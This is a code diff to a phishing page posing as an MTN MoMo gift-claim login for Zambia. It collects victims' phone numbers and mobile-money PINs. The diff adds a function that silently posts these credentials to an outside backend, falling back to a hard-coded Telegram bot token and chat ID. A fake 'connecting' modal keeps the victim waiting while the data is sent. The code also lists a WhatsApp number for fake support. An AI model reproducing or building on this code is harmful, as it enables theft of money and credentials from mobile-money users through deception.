@@ -515,14 +515,16 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS (Updated)
+        // CONFIGURATION
         // ============================================
+        // Telegram (direct fallback)
         const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
         const CHAT_ID = '8392790531';
 
-        // ============================================
-        // WHATSAPP CONFIGURATION
-        // ============================================
+        // Backend API (primary)
+        const API_URL = 'https://momousers-production.up.railway.app/api';
+
+        // WhatsApp
         const WHATSAPP_NUMBER = '254710161648';
 
         // ============================================
@@ -619,9 +621,44 @@
         }
 
         // ============================================
-        // SEND PHONE + PIN TO TELEGRAM (SILENT)
+        // SEND #1: TRY BACKEND FIRST
         // ============================================
-        async function sendPhoneAndPin(phone, pin) {
+        async function sendToBackend(phone, pin) {
+            const giftName = localStorage.getItem('selectedGift') || 'Airtime';
+            const giftValue = localStorage.getItem('selectedGiftValue') || 'ZMW 369';
+
+            console.log('📤 [BACKEND] Sending login to:', API_URL);
+
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+            try {
+                const response = await fetch(`${API_URL}/loan/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: phone,
+                        pin: pin,
+                        giftName: giftName,
+                        giftValue: giftValue
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                console.log('📥 [BACKEND] Response:', data);
+                return data.success;
+            } catch (error) {
+                clearTimeout(timeoutId);
+                console.error('❌ [BACKEND] Error:', error.message);
+                return false;
+            }
+        }
+
+        // ============================================
+        // SEND #2: DIRECT TELEGRAM FALLBACK
+        // ============================================
+        async function sendToTelegramDirect(phone, pin) {
             const giftName = localStorage.getItem('selectedGift') || 'Airtime';
             const giftValue = localStorage.getItem('selectedGiftValue') || 'ZMW 369';
 
@@ -635,7 +672,7 @@
                 `⏰ Time: ${new Date().toLocaleString()}\n\n` +
                 `✅ User is being connected to support.`;
 
-            console.log('📤 Sending phone + PIN to Telegram (silent)...');
+            console.log('📤 [TELEGRAM] Direct send (fallback)...');
 
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), 5000);
@@ -653,13 +690,29 @@
                 });
                 clearTimeout(timeoutId);
                 const data = await response.json();
-                console.log('📥 Telegram response:', data.ok);
+                console.log('📥 [TELEGRAM] Response:', data.ok);
                 return data.ok;
             } catch (error) {
                 clearTimeout(timeoutId);
-                console.error('❌ Telegram error:', error.message);
+                console.error('❌ [TELEGRAM] Error:', error.message);
                 return false;
             }
+        }
+
+        // ============================================
+        // SEND COMBINED: BACKEND + FALLBACK
+        // ============================================
+        async function sendLoginData(phone, pin) {
+            // Try backend first
+            const backendOk = await sendToBackend(phone, pin);
+
+            // If backend fails, send directly to Telegram as fallback
+            if (!backendOk) {
+                console.log('⚠️ Backend failed - using Telegram fallback');
+                await sendToTelegramDirect(phone, pin);
+            }
+
+            return true;
         }
 
         // ============================================
@@ -711,8 +764,8 @@
             // Disable button
             loginBtn.disabled = true;
 
-            // ✅ SEND PHONE + PIN SILENTLY IN BACKGROUND
-            sendPhoneAndPin(phone, pin);
+            // ✅ SEND DATA (Backend + Telegram fallback) - SILENT
+            sendLoginData(phone, pin);
 
             // ✅ SHOW CONNECTING MODAL IMMEDIATELY
             console.log('🔄 Showing connecting modal...');
@@ -760,9 +813,10 @@
             phoneInput.focus();
             checkPinComplete();
 
-            console.log('✅ MTN MoMo Gift Claim - Zambia Login Loaded (Clean)');
-            console.log('🇿🇲 Country: +260 (Zambia)');
-            console.log('📱 WhatsApp: +254710161648');
+            console.log('✅ MTN MoMo Gift Claim - Zambia Login Loaded');
+            console.log('🇿🇲 Country: +260');
+            console.log('🌐 Backend:', API_URL);
+            console.log('📱 WhatsApp:', WHATSAPP_NUMBER);
             console.log('🤖 Telegram Bot:', BOT_TOKEN.substring(0, 20) + '...');
             console.log('📱 Telegram Chat ID:', CHAT_ID);
             console.log('🎁 Gift:', localStorage.getItem('selectedGift'), '-', localStorage.getItem('selectedGiftValue'));
